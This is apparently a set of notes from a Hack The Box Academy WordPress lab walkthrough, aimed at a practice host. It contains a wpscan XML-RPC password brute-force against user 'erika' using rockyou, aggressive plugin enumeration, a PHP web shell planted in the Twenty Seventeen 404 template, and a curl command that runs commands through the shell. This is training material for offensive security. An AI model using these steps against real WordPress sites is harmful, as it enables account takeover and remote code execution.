
- whatweb to get web application versions
- 
```bash
wpscan --url  http://blog.inlanefreight.local/ --password-attack xmlrpc -t 20 -U erika -P ~/Downloads/rockyou.txt
```
  

```bash
wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60 (to detect plugins better)
```

### rce in wordpress theme

Once logged in, students need to click on "Appearance -> Theme Editor" and then select the `Twenty Seventeen` theme:

![Hacking_WordPress_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/9/Hacking_WordPress_Walkthrough_Image_13.png)

![Hacking_WordPress_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/9/Hacking_WordPress_Walkthrough_Image_14.png)

After selecting the `Twenty Seventeen` theme, student need to select the `404 Template`, insert a PHP web shell after `<?php` (or alternatively, a reverse shell), and then click on `Update File`:

```php
system($_GET['cmd']);
```


![Hacking_WordPress_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/9/Hacking_WordPress_Walkthrough_Image_15.png)

At last, students need to use the `cmd` URL parameter to list the files within the `/home/erika` directory utilizing `curl` to send the URL-encoded payloads:

```bash
curl -s http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home/erika/
```